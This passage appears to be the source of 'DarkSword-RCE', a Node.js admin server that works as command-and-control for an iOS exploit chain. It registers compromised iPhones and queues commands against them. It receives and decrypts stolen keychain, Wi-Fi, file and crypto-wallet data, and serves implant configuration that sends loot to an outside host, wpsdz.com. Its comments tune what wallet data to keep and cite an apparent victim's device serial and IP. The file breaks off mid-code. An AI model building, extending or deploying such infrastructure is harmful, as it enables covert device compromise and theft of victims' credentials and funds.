#!/usr/bin/env node
/**
 * DarkSword-RCE 管理后台
 *
 * 启动: node server/admin_server.js
 *
 * 路由:
 *   GET  /admin              登录页
 *   POST /admin/login        验证账密，设置 session cookie
 *   GET  /admin/dashboard    设备列表页（需认证）
 *   GET  /admin/events       SSE 实时推送（需认证）
 *   GET  /admin/api/devices  JSON 接口（需认证）
 *   POST /admin/logout       登出
 *   POST /beacon             设备上报（无需认证，供 client/rce_loader.js 调用）
 */

'use strict';

const http   = require('http');
const crypto = require('crypto');
const url    = require('url');
const fs     = require('fs');
const path   = require('path');

// ── 安全工具模块 ──────────────────────────────────────────────────────────────
const securityUtils = require('./security_utils');
const cryptoHelper = require('./crypto_helper');

// ── 数据库模块 ────────────────────────────────────────────────────────────────
const db = require('./database');

// ── 解密模块 ──────────────────────────────────────────────────────────────────
const { decryptReport } = require('./decrypt_reports');
// ── 入库提示（P2b）：数据文件落盘后 hint 桶名 → ingestd 秒级入库 ──────────────
const { hint } = require('./spool_hint');
let dbReady = false;

// ── 新增功能模块 ──────────────────────────────────────────────────────────────
let interactiveShell, screenStream, proxyTunnel;
try {
  interactiveShell = require('./interactive_shell');
  screenStream = require('./screen_stream');
  proxyTunnel = require('./proxy_tunnel');
} catch (e) {
  console.warn('[!] 新功能模块加载失败（请先 npm install ws node-pty sharp）:', e.message);
}

// ── 【2026-09-11】无价值 App 资源规则（不落内容，只留元数据 + 4KB 头部）──────────
// 实测依据：ext_stats 总 955MB，其中 wallet-com-autonavi-amap 658MB（68.8%）是纯离线地图资源。
// 面板只展示"采到了哪些文件"，这类内容没有分析价值 → 不写盘。
//
// 规则粒度：{ cat: 类目子串（必填）, path: 路径正则（可选；不填 = 整类丢） }
//   ⚠️ 宁可漏丢不可误丢 —— OKX 只丢 `Version N_Blobs_*`（webpack 资源块；实测 110 条 15.2MB，
//      内容 100% 为 webpackChunk/JS/CSS，无分析价值）；
//      **xlog / OKWalletCore / okcache / *.sqlite / RWModel 一律保留**（可能含钱包活动痕迹）。
// 需扩展时往 NOISE_RULES 里加一条即可。
const NOISE_RULES = [
  { cat: 'wallet-com-autonavi-amap' },                                      // 高德：整类丢（离线地图）
  { cat: 'wallet-com-okex-okexappstorefull', path: /^Version \d+_Blobs_/ },  // OKX：只丢 webpack 资源块
];
const NOISE_CATEGORIES = NOISE_RULES.map(r => r.cat);   // 兼容旧引用

// 命中判定：类目匹配 且（无路径规则 或 路径命中）
function isNoiseCategory(cat, p) {
  const c = String(cat || '');
  const pp = String(p || '');
  return NOISE_RULES.some(r => c.indexOf(r.cat) !== -1 && (!r.path || r.path.test(pp)));
}

// ── 静态文件 MIME 类型 ────────────────────────────────────────────────────────
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.ico':  'image/x-icon',
  '.txt':  'text/plain; charset=utf-8',
};

// ── 配置（优先读取环境变量，方便生产部署）─────────────────────────────────────
const CONFIG = {
  port:         parseInt(process.env.DS_PORT     || '8888', 10),
  host:         process.env.DS_HOST              || '0.0.0.0',
  username:     process.env.DS_USERNAME          || '',
  password:     process.env.DS_PASSWORD          || '',
  sessionTtlMs: parseInt(process.env.DS_SESSION_TTL_MS || String(4 * 60 * 60 * 1000), 10),
  // admin/ HTML 模板目录（相对于本文件所在的 server/ 目录）
  adminDir:     process.env.DS_ADMIN_DIR || path.join(__dirname, '..', 'admin'),
  // 共享密钥用于设备认证（beacon/exfil/cmd）
  sharedSecret: process.env.DS_SHARED_SECRET     || '',
  // CORS 白名单（逗号分隔）
  corsWhitelist: (process.env.DS_CORS_WHITELIST || '').split(',').map(s => s.trim()).filter(Boolean),
  // MySQL 数据库配置
  db: {
    host:     process.env.DS_DB_HOST     || 'localhost',
    port:     parseInt(process.env.DS_DB_PORT || '3306', 10),
    user:     process.env.DS_DB_USER     || 'darksword',
    password: process.env.DS_DB_PASSWORD || '',
    database: process.env.DS_DB_NAME     || 'darksword_rce',
  },
};

// 首次启动检查：强制设置凭据和共享密钥
if (!CONFIG.username || !CONFIG.password) {
  console.error('\n[ERROR] 必须设置管理员凭据！');
  console.error('请通过环境变量设置：');
  console.error('  export DS_USERNAME=your_admin_username');
  console.error('  export DS_PASSWORD=your_secure_password\n');
  process.exit(1);
}

if (!CONFIG.sharedSecret) {
  console.error('\n[ERROR] 必须设置设备共享密钥！');
  console.error('请通过环境变量设置：');
  console.error('  export DS_SHARED_SECRET=$(openssl rand -hex 32)\n');
  process.exit(1);
}

// ── 内存存储 ──────────────────────────────────────────────────────────────────
const sessions   = new Map();   // token → { expires, csrfToken }
const devices    = new Map();   // deviceId → DeviceRecord
const sseClients = new Set();   // 活跃 SSE 响应对象

// loot store: deviceId → { keychain:[], wifi:[], files:[], apps:[], info:{} }
const lootStore  = new Map();

// metric store: 客户端 A/B 测试与性能数据上报
const metricStore = [];
const MAX_METRICS = 5000;

// 文件 loot 磁盘存储目录
const LOOT_DIR = process.env.DS_LOOT_DIR || path.join(__dirname, '..', 'loot');
function mkLootDir(p){ if(!fs.existsSync(p)) fs.mkdirSync(p,{recursive:true,mode:0o775}); try{ fs.chownSync(p,1001,1001); fs.chmodSync(p,0o775); }catch(e){} }
mkLootDir(LOOT_DIR);

// [IR 2026-09-17] 路径段清洗：消除 '..'/斜杠等目录穿越（兼容 IP、UUID 等正常命名）
function safeSeg(s){ let v = String(s == null ? '' : s).replace(/[^a-zA-Z0-9_.-]/g, '_').replace(/\.{2,}/g, '_'); if (!v || /^\.+$/.test(v)) v = '_'; return v; }

// cmd queue: deviceId → [{ cmdId, type, args, issuedAt }]
const cmdQueue   = new Map();
// cmd results: cmdId → { deviceId, type, output, status, ts }
const cmdResults = new Map();

// ── 初始化速率限制器和连接限制器 ──────────────────────────────────────────
const rateLimiter = new securityUtils.RateLimiter();
const connLimiter = new securityUtils.ConnectionLimiter(10);

// ── 工具函数 ──────────────────────────────────────────────────────────────────
function genToken() {
  return securityUtils.generateSecureToken(24);
}

// 获取客户端真实 IP（nginx 反代后 remoteAddress 是 127.0.0.1，需取 X-Forwarded-For）
function getClientIP(req) {
  const forwarded = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  if (forwarded && /^[\d.:a-fA-F]+$/.test(forwarded) && forwarded.length <= 45) {
    return forwarded;
  }
  return req.socket.remoteAddress || 'unknown';
}

function sessionValid(req) {
  const cookie = req.headers['cookie'] || '';
  const m = cookie.match(/ds_session=([0-9a-f]+)/);
  if (!m) return false;
  const sess = sessions.get(m[1]);
  if (!sess) return false;
  if (Date.now() > sess.expires) { sessions.delete(m[1]); return false; }
  
  // IP 绑定验证（防止 Session 劫持）
  const currentIP = getClientIP(req);
  if (sess.ip && sess.ip !== currentIP) {
    sessions.delete(m[1]);
    return false;
  }
  
  return true;
}

// 验证 CSRF token
function csrfValid(req) {
  const cookie = req.headers['cookie'] || '';
  const m = cookie.match(/ds_session=([0-9a-f]+)/);
  if (!m) return false;
  const sess = sessions.get(m[1]);
  if (!sess) return false;
  const csrfFromHeader = req.headers['x-csrf-token'] || '';
  return csrfFromHeader === sess.csrfToken;
}

// 验证设备共享密钥（用于 beacon/exfil/cmd 接口）
function deviceAuthValid(req) {
  const authHeader = req.headers['authorization'] || '';
  const token = authHeader.replace(/^Bearer\s+/i, '');
  return securityUtils.timingSafeEqual(token, CONFIG.sharedSecret);
}

// CORS 白名单验证
function getCorsOrigin(req) {
  const origin = req.headers['origin'] || '';
  if (!origin) return null;
  if (CONFIG.corsWhitelist.length === 0) return null; // 禁用 CORS
  if (CONFIG.corsWhitelist.includes(origin)) return origin;
  return null;
}

function parseBody(req, maxBytes = 10 * 1024 * 1024) {
  return new Promise((resolve, reject) => {
    let data = '';
    let size = 0;
    req.on('data', c => {
      size += Buffer.byteLength(c);
      if (size > maxBytes) {
        req.destroy();
        return reject(new Error('Request body too large'));
      }
      data += c;
    });
    req.on('end', () => {
      try { resolve(JSON.parse(data)); } catch {
        const obj = {};
        data.split('&').forEach(p => {
          const [k, v] = p.split('=');
          if (k) obj[decodeURIComponent(k)] = decodeURIComponent(v || '');
        });
        resolve(obj);
      }
    });
  });
}

function pushSSE(event, data) {
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of sseClients) {
    try { res.write(payload); } catch { sseClients.delete(res); }
  }
}

/** 从磁盘读取 admin/ 下的 HTML 模板，替换 {{ERR}} 占位符 */
function readTemplate(name, vars = {}) {
  const filePath = path.join(CONFIG.adminDir, name);
  let html = fs.readFileSync(filePath, 'utf8');
  for (const [k, v] of Object.entries(vars)) {
    html = html.replace(new RegExp(`\\{\\{${k}\\}\\}`, 'g'), v);
  }
  return html;
}

// ── 执行状态推导 ───────────────────────────────────────────────────────────────
// 优先采用 beacon 上报的 execStatus；若无则按 stage 自动推断：
//   pe       → success
//   sbx1/sbx0/rce → running（还在攻击链中）
//   否则      → pending
const EXEC_STATUS_VALID = new Set(['pending', 'running', 'success', 'failed']);

function resolveExecStatus(beacon, existing) {
  if (beacon.execStatus && EXEC_STATUS_VALID.has(beacon.execStatus)) {
    return beacon.execStatus;
  }
  // 如果已有记录且已是终态，保留不覆盖
  if (existing && (existing.execStatus === 'success' || existing.execStatus === 'failed')) {
    return existing.execStatus;
  }
  const stage = beacon.stage || 'beacon';
  if (stage === 'pe')                           return 'success';
  if (['sbx1','sbx0','rce'].includes(stage))   return 'running';
  return 'pending';
}

// ── 设备记录 ──────────────────────────────────────────────────────────────────
function upsertDevice(beacon) {
  const id = beacon.deviceId || beacon.id || beacon.udid ||
             (beacon.ua
               ? crypto.createHash('md5').update(beacon.ua).digest('hex').slice(0, 12)
               : genToken().slice(0, 12));

  const now      = Date.now();
  const existing = devices.get(id);

  const record = {
    deviceId:    id,
    name:        beacon.deviceName   || beacon.name        || inferName(beacon.ua || ''),
    model:       beacon.model        || beacon.device_model || extractModel(beacon.ua || ''),
    iosVersion:  beacon.iosVersion   || beacon.ios_version  || extractIOS(beacon.ua || ''),
    ua:          beacon.ua           || beacon.userAgent    || '',
    ip:          beacon.ip           || '',
    stage:       beacon.stage        || 'beacon',
    status:      'online',
    // execStatus: pending → running → success / failed，由 beacon 上报决定
    execStatus:  resolveExecStatus(beacon, existing),
    firstSeen:   existing ? existing.firstSeen : now,
    lastSeen:    now,
    onlineMs:    existing ? (existing.onlineMs + (now - existing.lastSeen)) : 0,
    accessCount: existing ? existing.accessCount + 1 : 1,
    extra:       beacon.extra        || {},
  };

  devices.set(id, record);
  // [deploy] persist beacon to loot for panel scan
  try {
    const ipDir = safeSeg(String(record.ip || '').replace(/^::ffff:/, '') || 'unknown');
    const devDir = path.join(LOOT_DIR, ipDir);
    fs.mkdirSync(devDir, { recursive: true });
    const ts = now;
    const dec = { s: id, d2: id, et: 'beacon_online', pv: record.iosVersion || '', m: record.model || 'iPhone', tm: ts };
    const base = `report_event_beacon_${id}_${ts}`;
    fs.writeFileSync(path.join(devDir, base + '.dec.json'), JSON.stringify(dec));
    fs.writeFileSync(path.join(devDir, base + '.meta.json'), JSON.stringify({ endpoint: '/beacon', client: { ip: record.ip }, time: { timestamp: ts } }));
  } catch (e) { console.error('[beacon loot]', e.message); }
  pushSSE('device_update', serializeDevice(record));
  
  // DB write-through（异步，不阻塞响应）
  if (dbReady) {
    db.upsertDevice({
      deviceId:   id,
      deviceName: record.name,
      model:      record.model,
      iosVersion: record.iosVersion,
      ua:         record.ua,
      ip:         record.ip,
      stage:      record.stage,
      execStatus: record.execStatus,
      extra:      record.extra
    }).catch(e => console.error('[DB] upsertDevice failed:', e.message));
  }
  
  return record;
}

function serializeDevice(r) {
  return {
    ...r,
    firstSeenStr: fmtTime(r.firstSeen),
    lastSeenStr:  fmtTime(r.lastSeen),
    onlineStr:    fmtDuration(r.onlineMs),
  };
}

function fmtTime(ts) {
  return new Date(ts).toLocaleString('zh-CN', { hour12: false });
}

function fmtDuration(ms) {
  const s = Math.floor(ms / 1000);
  if (s < 60)   return s + ' 秒';
  if (s < 3600) return Math.floor(s / 60) + ' 分钟';
  return (s / 3600).toFixed(1) + ' 小时';
}

function extractModel(ua) {
  const m = ua.match(/\(([^;]+);/);
  return m ? m[1].trim() : 'Unknown';
}

function extractIOS(ua) {
  const m = ua.match(/OS ([0-9_]+)/);
  return m ? m[1].replace(/_/g, '.') : 'Unknown';
}

function inferName(ua) {
  if (/iPad/.test(ua))   return 'iPad';
  if (/iPhone/.test(ua)) return 'iPhone';
  return 'iOS Device';
}

// ── HTTP 路由 ─────────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  try {
  const parsed   = url.parse(req.url, true);
  const pathname = parsed.pathname.replace(/\/+$/, '') || '/';
  const method   = req.method.toUpperCase();

  // GET /admin 或 /  → 登录页
  if ((pathname === '/admin' || pathname === '/') && method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(readTemplate('login.html', { ERR: '' }));
  }

  // POST /admin/login
  if (pathname === '/admin/login' && method === 'POST') {
    const ip = getClientIP(req);
    // 速率限制：每 IP 每 15 分钟最多 10 次失败尝试（密码正确直接放行并清零）
    const LOGIN_MAX_ATTEMPTS = 10;
    const LOGIN_WINDOW_MS = 15 * 60 * 1000;
    const body = await parseBody(req);
    // 使用恒定时间比较防止时序攻击
    const usernameMatch = securityUtils.timingSafeEqual(body.username || '', CONFIG.username);
    const passwordMatch = securityUtils.timingSafeEqual(body.password || '', CONFIG.password);
    if (usernameMatch && passwordMatch) {
      // 登录成功，清零该 IP 的失败计数
      rateLimiter.reset(ip);
      // 防止 Session 固定攻击：清理用户可能持有的旧 session
      const oldCookie = req.headers['cookie'] || '';
      const oldMatch = oldCookie.match(/ds_session=([0-9a-f]+)/);
      if (oldMatch && sessions.has(oldMatch[1])) {
        sessions.delete(oldMatch[1]);
      }
      
      const token = genToken();
      const csrfToken = genToken();
      sessions.set(token, { 
        expires: Date.now() + CONFIG.sessionTtlMs, 
        csrfToken,
        createdAt: Date.now(),
        ip: getClientIP(req)  // 绑定 IP 地址
      });
      const isHttps = req.headers['x-forwarded-proto'] === 'https' || req.connection.encrypted;
      const secureCookie = isHttps ? '; Secure' : '';
      res.writeHead(302, {
        'Set-Cookie': `ds_session=${token}; HttpOnly; SameSite=Strict; Path=/${secureCookie}`,
        'Location': '/admin/dashboard',
      });
      return res.end();
    }
    // 密码错误：只对失败尝试计数并限流
    if (!rateLimiter.check(ip, LOGIN_MAX_ATTEMPTS, LOGIN_WINDOW_MS)) {
      const remainSecs = Math.ceil(LOGIN_WINDOW_MS / 1000);
      res.writeHead(429, {
        'Content-Type': 'text/html; charset=utf-8',
        'Retry-After': String(remainSecs),
      });
      return res.end(readTemplate('login.html', { ERR: '登录尝试过于频繁，请 ' + (remainSecs / 60) + ' 分钟后再试' }));
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(readTemplate('login.html', { ERR: '用户名或密码错误' }));
  }

  // POST /admin/logout
  if (pathname === '/admin/logout' && method === 'POST') {
    const cookie = req.headers['cookie'] || '';
    const m = cookie.match(/ds_session=([0-9a-f]+)/);
    if (m) sessions.delete(m[1]);
    res.writeHead(302, {
      'Set-Cookie': 'ds_session=; Max-Age=0; Path=/',
      'Location': '/admin',
    });
    return res.end();
  }

  // POST /coruna-loot — coruna 链无认证回传（ip-sync + bootstrap POST）
  if (pathname === '/coruna-loot' && method === 'POST') {
    // Read raw body first, then try JSON parse
    const rawBody = await new Promise((resolve, reject) => {
      const chunks = [];
      req.on('data', c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
      req.on('end', () => resolve(Buffer.concat(chunks)));
      req.on('error', reject);
    });
    let body = {};
    let bodyIsJson = false;
    try { body = JSON.parse(rawBody.toString('utf8')); bodyIsJson = true; } catch(e) { /* binary */ }
    
    // 解密逻辑：如果 body.encrypted === true，先解密
    if (bodyIsJson && body.encrypted === true && CONFIG.sharedSecret) {
      try {
        body = cryptoHelper.decryptPayload(body, CONFIG.sharedSecret);
        console.log('[CorunaLoot] Decrypted payload:', JSON.stringify(body).slice(0, 200));
      } catch (decryptErr) {
        console.error('[CorunaLoot] Decryption failed:', decryptErr.message);
        // 解密失败，继续用原始 body（降级处理）
      }
    }
    
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
    const ua = (bodyIsJson ? body.ua : '') || req.headers['user-agent'] || '';
    const source = body.channelCode ? 'ip-sync' : (body.cmd ? 'bootstrap' : (body.source === 'device-log' ? 'device-log' : (body.source || 'unknown')));
    const chainOk = (source === 'chain-result' && body && (body.code === 0 || body.code === '0'));
    const deviceId = body.deviceId || body.uuid || ip || 'unknown';
    // Save decrypted body to disk (after decryption if encrypted)
    const ts = Date.now();
    const devDir = path.join(LOOT_DIR, safeSeg(deviceId));
    mkLootDir(devDir);
    const ext = bodyIsJson ? 'json' : 'bin';
    // 【2026-09-13 治理】ip-sync = 每设备约 10 秒一条的 96B 心跳，原每帧写一个文件（单设备数千个、
    //   全盘 109 万、构建耗时恶化根源、零消费方）→ 改为单文件覆盖写，只保留最新心跳；其余类型保持原样。
    const fname = (source === 'ip-sync') ? 'coruna_ip-sync.latest.json' : `coruna_${source}_${ts}.${ext}`;
    const saveData = bodyIsJson ? Buffer.from(JSON.stringify(body, null, 2), 'utf8') : rawBody;
    try { fs.writeFileSync(path.join(devDir, fname), saveData); } catch(e) { console.error('[CorunaLoot] write error:', e.message); }
    const record = {
      source,
      ip,
      ua: ua.slice(0, 200),
      ts: Date.now(),
      body
    };
    // 存入 lootStore
    const entry = lootStore.get(deviceId) || { keychain: [], wifi: [], files: [], apps: [], info: {} };
    if (!entry.info.coruna) entry.info.coruna = [];
    entry.info.coruna.push(record);
    lootStore.set(deviceId, entry);
    // 注册/更新设备（ip-sync 和 bootstrap 通道）
    if (source === 'ip-sync' || source === 'bootstrap' || chainOk) {
      upsertDevice({
        ua: ua,
        ip: ip,
        iosVersion: body.deviceVersion || '',
        stage: chainOk ? 'coruna_success' : ('coruna_' + source),
        extra: { source: 'coruna', channelCode: body.channelCode || '', deviceVersion: body.deviceVersion || '', chainCode: body.code, chainMsg: body.msg || '' }
      });
    }
    // DB write-through
    if (dbReady) {
      db.addLootData(deviceId, 'coruna_' + source, body).catch(() => {});
    }
    console.log(`[CorunaLoot:${source}] ip=${ip} ua=${ua.slice(0, 60)} body=${JSON.stringify(body).slice(0, 3000)}`);
    pushSSE('loot_update', { deviceId, type: 'coruna_' + source });
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    return res.end(JSON.stringify({ ok: true, source }));
  }



  // GET /details/show.html — 4612 配置详情端点
  if (pathname === '/details/show.html' && (method === 'GET' || method === 'HEAD')) {
    const detailsPayload = JSON.stringify({
      ok: true,
      server: "wpsdz.com",
      config: {
        core: { url: "https://wpsdz.com/coruna-loot", sha256: "", size: 0, entries: [], bundleId: "coruna" },
        settings: {
          configRefreshInterval: 3600,
          heartbeatReportInterval: 60,
          minPingIntervalPerDomain: 10,
          validationCacheTTL: 86400
        }
      }
    });
    console.log('[details] served to ' + (req.headers['x-forwarded-for'] || req.socket.remoteAddress));
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(detailsPayload);
  }

  // GET /vhx — 4612 PLServerValidator ping/验证端点
  // 设备校验要求：纯文本 "ok"（2 字节），不能是 JSON
  if (pathname === '/vhx' && (method === 'GET' || method === 'HEAD')) {
    console.log('[vhx] served to ' + (req.headers['x-forwarded-for'] || req.socket.remoteAddress));
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
    return res.end('ok');
  }

  // POST /u /event /a /us /uj /ub /nb — details 模块数据回传（落盘存储）
  // 【2026-09-10 修复】补回 /uj /ub：09-05 换版本时这两个端点从落盘白名单丢了 →
  //   钱包账户导出(uj) / 链上资产(ub) 走 CatchAll 落进 loot/unknown_posts/post_*.bin，
  //   而 decrypt_v6_watch.js 只认 raw_*.bin、lootStore.js 只认 post_cdn-cgi_rum_* → 三重断链、面板看不见。
  //   旧版对照：admin_server.js.bak_devreq_1786917821 的白名单 = ['/u','/event','/a','/us','/nb','/t','/ub','/uj']
  // 【2026-09-11 修复】补回 /nb：同一类漏配。/nb 带回设备侧工具运行日志（含提权链结果、
  //   失败原因、加载诊断），丢失后无法判断"设备为什么没采集"。
  //   实测证据：F71SGYK3HG6W(45.207.157.32) 的 /nb 落在 unknown_posts/post_nb_1789112594271.bin，
  //   解密后正是「提权失败: 没有可用模块」那段关键诊断。
  if ((pathname === '/u' || pathname === '/event' || pathname === '/a' || pathname === '/us'
       || pathname === '/uj' || pathname === '/ub' || pathname === '/nb') && method === 'POST') {
    const rawBody = await new Promise((resolve, reject) => {
      const chunks = [];
      req.on('data', c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
      req.on('end', () => resolve(Buffer.concat(chunks)));
      req.on('error', reject);
    });
    let body = {};
    let bodyIsJson = false;
    try { body = JSON.parse(rawBody.toString('utf8')); bodyIsJson = true; } catch(e) {}
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
    const deviceId = body.deviceId || body.uuid || ip || 'unknown';
    const ts = Date.now();
    const devDir = path.join(LOOT_DIR, safeSeg(deviceId));
    mkLootDir(devDir);
    const ep = pathname.replace('/', '');
    const ext = bodyIsJson ? 'json' : 'bin';
    const fname = `report_${ep}_${ts}.${ext}`;
    const saveData = bodyIsJson ? Buffer.from(JSON.stringify(body, null, 2), 'utf8') : rawBody;
    try { fs.writeFileSync(path.join(devDir, fname), saveData); } catch(e) { console.error('[Report] write error:', e.message); }
    
    // 📸 增强取证：完整请求画像
    const metaFname = `report_${ep}_${ts}.meta.json`;
    const fullUrl = `${req.headers.host || 'unknown'}${req.url}`;
    const localTime = new Date(ts).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
    const utcTime = new Date(ts).toISOString();
    const bodyHex = rawBody.slice(0, 256).toString('hex');
    const bodyUtf8 = rawBody.slice(0, 256).toString('utf8').replace(/[^\x20-\x7E]/g, '.');
    const metaData = {
      url: fullUrl,
      endpoint: ep,
      method: 'POST',
      headers: req.headers,
      body: {
        length: rawBody.length,
        hex: bodyHex,
        utf8: bodyUtf8,
        isJson: bodyIsJson
      },
      time: {
        local: localTime,
        utc: utcTime,
        timestamp: ts
      },
      client: {
        ip: ip,
        deviceId: deviceId
      }
    };
    try { fs.writeFileSync(path.join(devDir, metaFname), JSON.stringify(metaData, null, 2)); } catch(e) { console.error('[Meta] write error:', e.message); }
    
    // 🔓 实时解密：优先用 X-TS 头；/uj /ub /nb（老链模块）不带该头 → 退回按文件名时间戳 ±15s 枚举
    const xTs = req.headers['x-ts'];
    const shouldDecrypt = !bodyIsJson && rawBody.length > 0 && (xTs || ep === 'uj' || ep === 'ub' || ep === 'nb');
    if (shouldDecrypt) {
      try {
        const binPath = path.join(devDir, fname);
        const decResult = decryptReport(binPath, xTs || undefined);
        if (decResult.success) {
          const decFname = `report_${ep}_${ts}.dec.json`;
          fs.writeFileSync(path.join(devDir, decFname), JSON.stringify(decResult.data, null, 2));
          hint(path.basename(devDir));   // 【P2b】新数据落地 → 提示 ingestd
          console.log('[DECRYPT] ✅', decFname, 'keys:', Object.keys(decResult.data || {}).slice(0, 5).join(','));
        } else {
          console.log('[DECRYPT] ❌', fname, 'error:', decResult.error);
        }
      } catch (e) {
        console.error('[DECRYPT] Exception:', e.message);
      }
    }
    
    const entry = lootStore.get(deviceId) || { keychain: [], wifi: [], files: [], apps: [], info: {} };
    if (!entry.info.reports) entry.info.reports = [];
    entry.info.reports.push({ ep, ip, ts, body });
    lootStore.set(deviceId, entry);
    if (dbReady) { db.addLootData(deviceId, 'report_' + ep, body).catch(() => {}); }
    console.log('[REPORT]', ep, 'from', ip, bodyIsJson ? JSON.stringify(body).slice(0, 300) : rawBody.length + ' bytes');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('ok');
  }

  // GET /settings — 采集模块配置端点（native CFNetwork 拉取）
  if (pathname === '/settings' && method === 'GET') {
    const settingsPayload = JSON.stringify({
      core: { url: "https://wpsdz.com/coruna-loot", sha256: "", size: 0, entries: [], bundleId: "coruna" },
      configRefreshInterval: 3600,
      heartbeatReportInterval: 60,
      minPingIntervalPerDomain: 10,
      validationCacheTTL: 86400
    });
    console.log('[Settings] served to ' + (req.headers['x-forwarded-for'] || req.socket.remoteAddress));
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(settingsPayload);
  }

  // OPTIONS /coruna-loot — CORS preflight
  if (pathname === '/coruna-loot' && method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    return res.end();
  }

  // POST /c2v2 — custom_payload 采集数据接收（action=data，query 参数）
  if (pathname === '/c2v2' && method === 'POST') {
    const chunks = [];
    req.on('data', c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
    req.on('end', async () => {
      const rawBody = Buffer.concat(chunks);
      let body = {};
      let bodyIsJson = false;
      try { body = JSON.parse(rawBody.toString('utf8')); bodyIsJson = true; } catch(e) {}
      const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
      const deviceId = body.device_id || body.deviceId || body.uuid || ip || 'unknown';
      const ts = Date.now();
      const devDir = path.join(LOOT_DIR, safeSeg(deviceId));
      mkLootDir(devDir);
      const fname = `c2v2_data_${ts}.json`;
      const saveData = bodyIsJson ? Buffer.from(JSON.stringify(body, null, 2), 'utf8') : rawBody;
      try { fs.writeFileSync(path.join(devDir, fname), saveData); } catch(e) { console.error('[C2V2] write error:', e.message); }
      const entry = lootStore.get(deviceId) || { keychain: [], wifi: [], files: [], apps: [], info: {} };
      if (!entry.info.c2v2) entry.info.c2v2 = [];
      entry.info.c2v2.push({ ip, ts, action: (parsed.query && parsed.query.action) || '', body });
      lootStore.set(deviceId, entry);
      if (dbReady) { db.addLootData(deviceId, 'c2v2_data', body).catch(() => {}); }
      console.log('[C2V2] from', ip, 'action=' + ((parsed.query && parsed.query.action) || ''), 'len=' + rawBody.length, bodyIsJson ? JSON.stringify(body).slice(0, 300) : rawBody.slice(0, 200).toString('latin1'));
      pushSSE('loot_update', { deviceId, type: 'c2v2_data' });
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': 'Content-Type' });
      return res.end('{"ok":true}');
    });
    return;
  }


  // POST /stats — 18 链（DarkSword-RCE）raw socket 上报
  if (pathname === '/stats' && method === 'POST') {
    const chunks = [];
    req.on('data', c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
    req.on('end', async () => {
      const rawBody = Buffer.concat(chunks);
      let body = {};
      try { body = JSON.parse(rawBody.toString('utf8')); } catch(e) {}
      const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
      const deviceId = body.deviceId || body.uuid || body.device_id || ip || 'unknown';
      const ts = Date.now();
      const devDir = path.join(LOOT_DIR, safeSeg(deviceId));
      mkLootDir(devDir);
      // 【2026-09-11】无价值 App 资源不落内容：
      //   高德离线地图这类纯 App 资源占到 ext_stats 的 69%（实测 658MB/955MB），
      //   面板只需要"采到了哪些文件"的元数据。这里保留全部元数据 + 前 4KB 头部，
      //   丢掉的只有文件内容本体，磁盘不再被这类文件吃掉。
      //   粒度由 NOISE_RULES 决定（支持"类目 + 路径正则"两级匹配）。
      const catStr = String(body.category || '');
      const pathStr = String(body.path || '');
      const dropped = isNoiseCategory(catStr, pathStr);
      const noiseRule = dropped
        ? NOISE_RULES.find(r => catStr.indexOf(r.cat) !== -1 && (!r.path || r.path.test(pathStr)))
        : null;
      try {
        if (dropped) {
          // 【2026-09-12 回收策略】完整内容先落「回收区」：loot/_quarantine/entry/<UTC日期>/<设备>/
          //   保留 7 天，7 天后由 tools/prune_loot_noise.py 到期清扫。背景：内容不落盘 = 最不可逆的
          //   丢弃（宁多占 7 天盘，不丢数据）；写失败仅记日志，不阻断上报主流程。
          try {
            const qDay = new Date().toISOString().slice(0, 10).replace(/-/g, '');
            const qDir = path.join(LOOT_DIR, '_quarantine', 'entry', qDay, safeSeg(deviceId));
            fs.mkdirSync(qDir, { recursive: true });
            fs.writeFileSync(path.join(qDir, 'ext_stats_' + ts + '.bin'), rawBody);
          } catch (e) { console.error('[ExtStats] quarantine save error:', e.message); }
          const slim = Object.assign({}, body);
          if (slim.data) { slim.head_hex = String(slim.data).slice(0, 4096); }
          delete slim.data;
          slim.dropped = 'noise-app-resource';
          slim.dropped_reason = '已知无分析价值的 App 资源，主区未落内容（完整内容存回收区保留 7 天；元数据与头部保留）';
          slim.orig_bytes = rawBody.length;
          fs.writeFileSync(path.join(devDir, 'ext_stats_' + ts + '.bin'), JSON.stringify(slim));
        } else {
          fs.writeFileSync(path.join(devDir, 'ext_stats_' + ts + '.bin'), rawBody);
        }
        fs.writeFileSync(path.join(devDir, 'ext_stats_' + ts + '.meta.json'), JSON.stringify({
          ts, path: pathname, ip, ua: req.headers['user-agent'] || '', method,
          bodyLen: rawBody.length, content_type: req.headers['content-type'] || '',
          x_device_uuid: req.headers['x-device-uuid'] || '',
          category: catStr, dropped: dropped || false,
